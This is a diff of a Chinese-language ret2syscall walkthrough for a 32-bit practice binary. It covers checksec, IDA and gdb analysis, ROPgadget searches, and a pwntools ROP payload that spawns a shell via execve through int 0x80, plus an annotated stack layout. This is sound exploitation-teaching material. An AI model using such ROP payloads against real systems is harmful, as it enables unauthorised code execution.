@@ -8,7 +8,7 @@
 >
 > 原始出处未知，非比赛题目(也许)，故所在文件夹命名方式有所区别
 
-
+- 该例无法直接使用程序自身get shell，需构造参数后，使用系统调用`int 0x80`，实现`execve("/bin/sh", NULL, NULL);`
 
 # checksec
 
@@ -16,15 +16,15 @@
 $ file ./ret2syscall
 ./ret2syscall: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped
 $ checksec --file=ret2syscall
-RELRO          STACK CANARY     NX         PIE     RPATH     RUNPATH     Symbols       FORTIFY Fortified  Fortifiable  FILE
-Partial RELRO  No canary found  NX enabled No PIE  No RPATH  No RUNPATH  2255) Symbols   No    0          0            ret2syscall
+RELRO          STACK CANARY     NX         PIE     RPATH     RUNPATH    Symbols      FORTIFY Fortified Fortifiable FILE
+Partial RELRO  No canary found  NX enabled No PIE  No RPATH  No RUNPATH 2255) Symbols  No    0         0           ret2syscall
 ```
 
 - 32bit，开启NX保护，没有其他保护
 
 
 
-# main
+# IDA: main
 
 - IDA中显示的main函数的伪c代码：
 
@@ -48,7 +48,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 .text:08048E8A                 call    puts            ; Call Procedure
 .text:08048E8F                 lea     eax, [esp+28]   ; Load Effective Address
 .text:08048E93                 mov     [esp], eax
-.text:08048E96                 call    gets            ; gets(&v4); # 调用 gets(&v4); 的地方
+.text:08048E96                 call    gets            ; gets(&v4); # 调用 gets(&v4); 的地方 ; 后面gdb的断点可以下在这
 .text:08048E9B                 mov     eax, 0
 .text:08048EA0                 leave                   ; High Level Procedure Exit
 .text:08048EA1                 retn                    ; Return Near from Procedure
@@ -58,7 +58,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 
 # gdb：偏移地址分析
 
-```c
+```assembly
 $ gdb -q ./ret2syscall
 pwndbg: loaded 188 commands. Type pwndbg [filter] for a list.
 pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
@@ -74,13 +74,13 @@ Breakpoint 1, 0x08048e96 in main () at rop.c:15
 15      rop.c: No such file or directory.
 LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 ─────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────
- EAX  0xffffd3dc —▸ 0x80bce97 (__register_frame_info+39) ◂— add    esp, 0x1c
+ EAX  0xffffd3dc —▸ 0x80bce97 (__register_frame_info+39) ◂— add    esp, 0x1c ; v4地址：0xffffd3dc
  EBX  0x80481a8 (_init) ◂— push   ebx
  ECX  0x80eb4d4 (_IO_stdfile_1_lock) ◂— 0x0
  EDX  0x18
  EDI  0x80ea00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8065cb0 (__stpcpy_ssse3) ◂— mov    edx, dword ptr [esp + 4]
  ESI  0x0
- EBP  0xffffd448 —▸ 0x8049630 (__libc_csu_fini) ◂— push   ebx
+ EBP  0xffffd448 —▸ 0x8049630 (__libc_csu_fini) ◂— push   ebx ; ebp: 0xffffd448
  ESP  0xffffd3c0 —▸ 0xffffd3dc —▸ 0x80bce97 (__register_frame_info+39) ◂— add    esp, 0x1c
  EIP  0x8048e96 (main+114) ◂— call   0x804f650
 ───────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────
@@ -222,8 +222,6 @@ $ ROPgadget --binary ret2syscall  --only "int" # 找 int 0x80 的地址
 Gadgets information
 ============================================================
 0x08049421 : int 0x80
-
-Unique gadgets found: 1
 ```
 
 - 找到`int 0x80`的地址`0x08049421`
@@ -240,8 +238,43 @@ pop_edx_ecx_ebx_ret = 0x0806eb90
 int_0x80 = 0x08049421
 binsh = 0x80be408
 payload = flat(['A' * (108 + 4), pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80]) 
+# pop_eax_ret 将覆盖在 gets(&v4); 的返回地址上
 # 0xb: execve的系统调用号 # type(payload) = bytes
 sh.sendline(payload)
 sh.interactive()
 ```
 
+
+
+## payload Analysis
+
+```python
+# 先将payload的所有用于覆盖RA用的地址换成8bytes的全c,d,e,f
+payload = flat(['A' * (108 + 4), 0xcccccccc, 0xb, 0xdddddddd, 0, 0, 0xeeeeeeee,0xffffffff])
+# 忽略掉前面的所有A，则剩下的 payload.hex() 输出为：
+# cccccccc0b000000dddddddd0000000000000000eeeeeeeeffffffff
+```
+
+对于`gets(&v4)`来说，被payload覆盖后的栈如下所示（捋逻辑时从下往上看）
+
+```assembly
+; High Address 高地址 ; gets函数的栈被payload覆盖之后如下
+ffffffff ; ret; 相当于pop EIP; 跳转到执行 int 0x80
+eeeeeeee ; pop ebx ; ebx的值更改为eeeeeeee 实际为"/bin/sh"的地址
+00000000 ; pop ecx ; ecx的值更改为0，执行完后ESP上移
+00000000 ; pop edx ; edx的值更改为0，执行前ESP指向这里，执行完后ESP上移
+dddddddd ; ret指令相当于pop EIP; EIP的值被更改为dddddddd ; 跳转到执行 pop_edx_ecx_ebx_ret
+0b000000 ; pop eax; eax 的值被更改为 0xb; 然后ESP向上移，ESP指向dddddddd
+cccccccc ; ret; 相当于pop EIP; ESP上移; EIP被修改为cccccccc; overflow: Original RA => cccccccc; 覆盖为pop_eax_ret的地址
+41414141 ; 在执行ret指令前，ESP会被恢复到指向EBP处
+........
+41414141
+; Low Address 低地址
+```
+
+- 从下网上看注释，可以发现ESP的值随着接连不断的pop; ret(pop EIP)指令而不断上移(值增大)，在这过程中，eax, edx, ecx, ebx被依次改变，最后跳转到`int 0x80`，实现了 `execve("/bin/sh", NULL, NULL);`的系统调用
+
+> - 系统调用号，`eax` 应该为 0xb   （查32bit的系统调用号）
+> - 第一个参数，`ebx` 应该指向 `/bin/sh` 的地址，其实执行 `sh` 的地址也可以。
+> - 第二个参数，`ecx` 应该为 0
+> - 第三个参数，`edx` 应该为 0
